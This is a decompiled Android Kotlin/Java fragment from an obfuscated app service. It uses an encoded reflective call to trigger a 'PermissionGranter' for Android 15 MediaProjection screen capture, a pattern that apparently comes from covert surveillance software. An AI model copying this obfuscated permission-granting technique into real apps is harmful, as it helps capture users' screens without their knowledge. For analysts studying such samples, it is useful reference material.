package com.storm.safe.rock.service;

import com.storm.safe.rock.manager.C0260a2;
import com.storm.safe.rock.util.StringUtil;
import java.lang.reflect.Method;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import p000.C1351vv;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.b81;
import p000.kg1;
import p000.l10;
import p000.t60;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
@InterfaceC1116qn(m214402c = "com.storm.safe.rock.service.dqtvuisjd$permissionRequestReceiver$1$onReceive$6", m214403f = "dqtvuisjd.kt", m214404l = {5156}, m214405m = "invokeSuspend")
/* loaded from: classes2.dex */
public final class dqtvuisjd$permissionRequestReceiver$1$onReceive$6 extends SuspendLambda implements l10 {

    /* renamed from: a1 */
    public int f52654a1;

    /* renamed from: a2 */
    public final /* synthetic */ dqtvuisjd f52655a2;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public dqtvuisjd$permissionRequestReceiver$1$onReceive$6(dqtvuisjd dqtvuisjdVar, InterfaceC0876mv interfaceC0876mv) {
        super(2, interfaceC0876mv);
        this.f52655a2 = dqtvuisjdVar;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
        return new dqtvuisjd$permissionRequestReceiver$1$onReceive$6(this.f52655a2, interfaceC0876mv);
    }

    @Override // p000.l10
    public final Object invoke(Object obj, Object obj2) {
        return ((dqtvuisjd$permissionRequestReceiver$1$onReceive$6) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2)).invokeSuspend(C1351vv.f60710b1);
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final Object invokeSuspend(Object obj) throws Throwable {
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i = this.f52654a1;
        dqtvuisjd dqtvuisjdVar = this.f52655a2;
        if (i == 0) {
            kg1.m213544f4(obj);
            try {
            } catch (Exception e) {
                t60.m214705c6("dqtvuisjd", "❌ 调用Android 15权限完成处理失败，使用默认处理", e);
                this.f52654a1 = 1;
                if (b81.m210571b1(10000L, this) == coroutineSingletons) {
                    return coroutineSingletons;
                }
            }
            if (dqtvuisjdVar.f52369a0 == null) {
                t60.m214724f2("permissionGranter");
                throw null;
            }
            Method declaredMethod = C0260a2.class.getDeclaredMethod(StringUtil.m212470a0("I1gfPkE9LSBTIyRQFWsYCAk8Wjg4Shg1QxsDI0c9Lk0U"), null);
            declaredMethod.setAccessible(true);
            C0260a2 c0260a2 = dqtvuisjdVar.f52369a0;
            if (c0260a2 != null) {
                declaredMethod.invoke(c0260a2, null);
                return C1351vv.f60710b1;
            }
            t60.m214724f2("permissionGranter");
            throw null;
        }
        if (i != 1) {
            throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
        kg1.m213544f4(obj);
        C0260a2 c0260a22 = dqtvuisjdVar.f52369a0;
        if (c0260a22 != null) {
            c0260a22.m211325g8(false);
            t60.m214714d6("dqtvuisjd", "✅ Android 15 MediaProjection权限稳定，已重置PermissionGranter状态");
        }
        return C1351vv.f60710b1;
    }
}
